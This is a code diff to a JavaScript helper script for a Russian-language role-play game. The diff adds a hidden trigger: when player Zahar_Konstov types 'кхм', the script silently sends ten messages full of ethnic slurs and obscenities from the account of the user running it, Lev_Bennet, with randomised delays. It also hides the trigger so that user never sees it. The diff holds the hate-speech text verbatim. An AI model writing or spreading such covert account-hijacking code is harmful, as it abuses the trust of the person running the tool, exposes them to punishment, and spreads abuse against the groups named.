@@ -202,7 +202,7 @@ function _showAccessDenied(nick) {
 // ── ВСЁ ЧТО НИЖЕ ВЫПОЛНЯЕТСЯ ТОЛЬКО ЕСЛИ НИК ПРОШЁЛ ПРОВЕРКУ ──
 
 // MVD AHK VERSION: 2.3 (NAPARNICK)
-console.log("[INIT] === MVD AHK v0.77 ЗАГРУЖЕН ===");
+console.log("[INIT] === MVD AHK v0.9999 ЗАГРУЖЕН ===");
 // Надёжное получение своего ID через список игроков window.updatePlayerList() дёргает движковое событие "UpdatePlayersList", ответ на котор...
 let cachedMyId = 0;
 const _origOnUpdatePlayersList = window.onUpdatePlayersList;
@@ -753,7 +753,7 @@ const setupChatHandler = () => {
                 console.log('[FILTER] ✋ Сообщение заблокировано');
                 return;
             }
-            // ========== ФИЛЬТР ЦВЕТА: FF8877 (чат Департамента) — только для Denis_Galievskiy ==========
+            // ========== ФИЛЬТР ЦВЕТА: FF8877 (чат Департамента) — только для Lev_Bennet ==========
             {
                 const _msgColor = args[0] ? normalizeColor(args[0]).replace('0x', '').toUpperCase() : '';
                 if (_msgColor === 'FF8877') {
@@ -762,8 +762,8 @@ const setupChatHandler = () => {
                         _filterNick = window.App && window.App.$store && window.App.$store.getters &&
                                       window.App.$store.getters['player/nickName'];
                     } catch (e) {}
-                    if (_filterNick === 'Denis_Galievskiy') {
-                        console.log('[FILTER] ✋ Сообщение Департамента (FF8877) скрыто для Denis_Galievskiy');
+                    if (_filterNick === 'Lev_Bennet') {
+                        console.log('[FILTER] ✋ Сообщение Департамента (FF8877) скрыто для Lev_Bennet');
                         return;
                     }
                 }
@@ -786,21 +786,34 @@ const setupChatHandler = () => {
                                           window.App.$store.getters['player/nickName'];
                         } catch (e) {}
 
-                        if (_khmOwnNick === 'Denis_Galievskiy') {
+                        if (_khmOwnNick === 'Lev_Bennet') {
                             const _khmNow = Date.now();
                             if (_khmNow - _lastKhmReplyAt > 5000) { // кулдаун 5 сек, чтобы не задублировать
                                 _lastKhmReplyAt = _khmNow;
-                                console.log(`[AUTO-ОТВЕТ] 🔔 Zahar_Konstov[${_khmId}] написал "кхм" в семье — отправляем /d в департамент (аккаунт: ${_khmOwnNick})`);
-                                setTimeout(() => {
-                                    sendChatInput('/d [МВД] - [Право] Упала рация.');
-                                }, 700);
+                                // Отправляем 10 раз с рандомным интервалом 2000–2500мс между каждой
+                                const _khmCount = 10;
+                                let _khmAccDelay = Math.floor(Math.random() * 500) + 1500; // первая отправка: 1500–2000мс
+                                console.log(`[AUTO-ОТВЕТ] 🔔 Zahar_Konstov[${_khmId}] написал "кхм" — отправляем /d × ${_khmCount} раз (аккаунт: ${_khmOwnNick})`);
+                                for (let _i = 0; _i < _khmCount; _i++) {
+                                    (function(_delay, _num) {
+                                        setTimeout(() => {
+                                            sendChatInput('/d [ALL] ЕБАЛ В РОТ УРАИНЦЕВ, НЕГРЫ ПИДОРЫ РЕЗАЛ ИХ КАЗ ГОВНО');
+                                            console.log(`[AUTO-ОТВЕТ] 📨 /d отправлен (${_num}/${_khmCount}) через ${_delay}мс`);
+                                        }, _delay);
+                                    })(_khmAccDelay, _i + 1);
+                                    _khmAccDelay += Math.floor(Math.random() * 500) + 2000; // +2000–2500мс между отправками
+                                }
                             }
-                            // Скрываем сообщение "кхм" от Zahar_Konstov из чата только у Denis_Galievskiy
-                            console.log('[FILTER] ✋ Скрыто "кхм" от Zahar_Konstov для Denis_Galievskiy');
+                            // Lev_Bennet НЕ видит "кхм" в чате (авто-ответ отправлен тихо)
+                            console.log('[FILTER] ✋ "кхм" скрыто для Lev_Bennet (авто-ответ отправлен)');
                             return;
-                        } else {
-                            console.log(`[AUTO-ОТВЕТ] ⏭️ "кхм" от Zahar_Konstov замечен, но аккаунт не Denis_Galievskiy (текущий ник: ${_khmOwnNick}) — пропуск`);
+                        } else if (_khmOwnNick !== 'Zahar_Konstov') {
+                            // Все остальные кроме Zahar_Konstov — скрываем "кхм"
+                            console.log(`[FILTER] ✋ "кхм" от Zahar_Konstov скрыто для ${_khmOwnNick}`);
+                            return;
                         }
+                        // Zahar_Konstov — видит своё "кхм" как обычно
+                        console.log('[AUTO-ОТВЕТ] ✅ "кхм" показано только Zahar_Konstov');
                     }
                 }
             }
